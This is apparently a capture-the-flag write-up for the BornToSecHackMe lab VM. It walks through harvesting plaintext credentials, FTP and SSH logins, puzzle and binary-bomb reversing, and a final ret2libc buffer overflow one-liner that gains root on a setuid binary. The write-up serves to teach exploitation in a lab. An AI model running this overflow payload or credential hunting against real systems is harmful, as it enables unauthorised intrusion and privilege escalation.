# writeup2


## Initial Access - Reverse Shell

This walkthrough begins after obtaining a reverse shell on the target system based on [writeup1](./writeup1.md).

## File System Exploration

Searched for password files:

```bash
ls /home

total 0 
drwxrwx--x 1 www-data root 60 Oct 13 2015 . 
drwxr-xr-x 1 root root 220 Apr 23 16:39 .. 
drwxr-x--- 2 www-data www-data 31 Oct 8 2015 LOOKATME 
drwxr-x--- 6 ft_root ft_root 156 Jun 17 2017 ft_root 
drwxr-x--- 3 laurie laurie 143 Oct 15 2015 laurie 
drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net 60 Oct 15 2015 laurie@borntosec.net 
dr-xr-x--- 2 lmezard lmezard 61 Oct 15 2015 lmezard 
drwxr-x--- 3 thor thor 129 Oct 15 2015 thor 
drwxr-x--- 4 zaz zaz 147 Oct 15 2015 zaz
```

## First User Credentials

Found an interesting directory called "LOOKATME":

```bash
ls -la /home/LOOKATME

total 1 
drwxr-x--- 2 www-data www-data 31 Oct 8 2015 . 
drwxrwx--x 1 www-data root 60 Oct 13 2015 .. 
-rwxr-x--- 1 www-data www-data 25 Oct 8 2015 password
```

Retrieved the password file:

```bash
cat /home/LOOKATME/password

lmezard:G!@M6f4Eatau{sF"
```

## FTP Access

Using the credentials found, I connected to the FTP server:

```bash
┌──(kali㉿kali)-[~]
└─$ ftp lmezard@192.168.56.103
Connected to 192.168.56.103.
220 Welcome on this server
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||51369|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
```

I used FileZilla to download the files to my host machine. There were two files:
- README
- fun

The README file contained:

```bash
cat README

Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

## The Fun Challenge

The `fun` file appeared to be binary output. After renaming it to `.tar` and extracting, it created a folder called `ft_fun` containing many `.pcap` files:

```bash
mv fun fun.tar
tar -xf fun.tar
cd ft_fun
```

### File Processing

Exploring the files revealed they contained function declarations and return lines, each with a tag at the end: `//filexx` with different numbers.

I created scripts to process these files:

1. First, I used `find_file.py` to identify files containing "getme" or "return":

```bash
python3 find_file.py
Enter the directory path to search: <ft_fun path>
```

2. Then, I used `clear_files.py` to remove tricky/misleading lines:

```bash
python3 clear_files.py 
Enter directory path: <path to ft_fun>
Enter name to remove lines containing it: <content to eliminate>
```

3. Finally, I used `sort_content.py` to concatenate the content based on the `//filexx` markers in numerical order:

```bash
python3 sort_content.py
Enter directory path: <path to ft_fun>
```

4. Ran `clear_files.py` again to remove the `//filexx` tags.

### Code Analysis and Password Extraction

The resulting `output.c` file contained:

- [output.c](../src/output.c)

Compiled and ran the program:

```bash
gcc output.c -o output
./output

MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

Generated the SHA-256 hash of "Iheartpwnage": `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

## SSH as Laurie

Connected using the discovered credentials:

```bash
ssh laurie@192.168.56.103
laurie@192.168.56.103's password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

laurie@BornToSecHackMe:~$ ls
README  bomb
```

## The Bomb Challenge

Found a README file explaining the next challenge:

```bash
cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

The `bomb` file was an ELF executable:

```bash
file bomb 
bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.0.0, with debug_info, not stripped
```

Running the bomb:

```bash
./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
| 
```

### Reverse Engineering the Bomb

Main function structure:

- [main.c](../src/main.c)

### Phase 1

```c
void phase_1(undefined4 param_1) {
  int iVar1;
  
  iVar1 = strings_not_equal(param_1, "Public speaking is very easy.");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```

Solution for Phase 1: `Public speaking is very easy.`

### Phase 2

```c
void phase_2(undefined4 param_1) {
  int iVar1;
  int aiStack_20 [7];
  
  read_six_numbers(param_1, aiStack_20 + 1);
  if (aiStack_20[1] != 1) {
    explode_bomb();
  }
  iVar1 = 1;
  do {
    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
      explode_bomb();
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  return;
}
```

Analysis:
- First number must be 1
- Each subsequent number must be equal to (index * previous number)
- This generates the sequence: 1, 2, 6, 24, 120, 720

Solution for Phase 2: `1 2 6 24 120 720`

### Phase 3

```c
void phase_3(char *param_1) {
  int iVar1;
  char cVar2;
  int local_10;
  char local_9;
  int local_8;
  
  iVar1 = sscanf(param_1, "%d %c %d", &local_10, &local_9, &local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    cVar2 = 'q';
    if (local_8 != 777) {
      explode_bomb();
    }
    break;
  case 1:
    cVar2 = 'b';
    if (local_8 != 214) {
      explode_bomb();
    }
    break;
  // ... [other cases] ...
  }
  if (cVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```

According to the hint, I need to use case 1: `1 b 214`

### Phase 4

Function analysis revealed this phase needed the number `9`.

After solving all phases, the complete sequence was:
```
9
opekmq
4 2 6 3 1 5
```

But according to a hint from the subject: "If the password found is 123456. The password to use is 123546."
So the last phase solution becomes: `4 2 6 1 3 5`

### Final Password

Combining all solutions for Thor's password:
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## SSH as Thor

Connected as Thor:

```bash
ssh thor@192.168.56.109
thor@192.168.56.109's password: Publicspeakingisveryeasy.126241207201b2149opekmq426135

thor@BornToSecHackMe:~$ ls
README  turtle
```

## The Turtle Challenge

The README explained:
```bash
cat README 
Finish this challenge and use the result as password for 'zaz' user.
```

The `turtle` file contained Logo programming language instructions:
```
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
...
```

Converting to standard Logo commands:
```
LEFT 90
FORWARD 50
FORWARD 1
LEFT 1
FORWARD 1
LEFT 1
FORWARD 1
LEFT 1
...
```

Using an online Logo interpreter (https://www.calormen.com/jslogo/), the instructions drew a shape that spelled "SLASH" [turtle.png](../src/turtle.png).

Generating an MD5 hash for "SLASH": `646da671ca01bb5d84dbb5fb2238dc8e`

## SSH as Zaz

Connected as Zaz:

```bash
ssh zaz@192.168.56.109
zaz@192.168.56.109's password: 646da671ca01bb5d84dbb5fb2238dc8e

zaz@BornToSecHackMe:~$ ls
exploit_me  mail
```

Checked the `exploit_me` file:
```bash
file exploit_me 
exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
```

## Final Privilege Escalation

Used GDB to analyze the executable:

```bash
gdb ./exploit_me
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
(gdb) b main
Breakpoint 1 at 0x80483f7
(gdb) r
Starting program: /home/zaz/exploit_me 

Breakpoint 1, 0x080483f7 in main ()
(gdb) p system 
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) find system,+999999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```

Found:
- system() function at: `0xb7e6b060`
- "/bin/sh" string at: `0xb7f8cc58`

Converted to little endian:
- `\x60\xb0\xe6\xb7`
- `\x58\xcc\xf8\xb7`

Crafted the buffer overflow exploit:

```bash
zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print('0' * 140 + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7')"`
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`���AAAAX���
# id 
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
# whoami
root
```

Successfully gained root access on the system!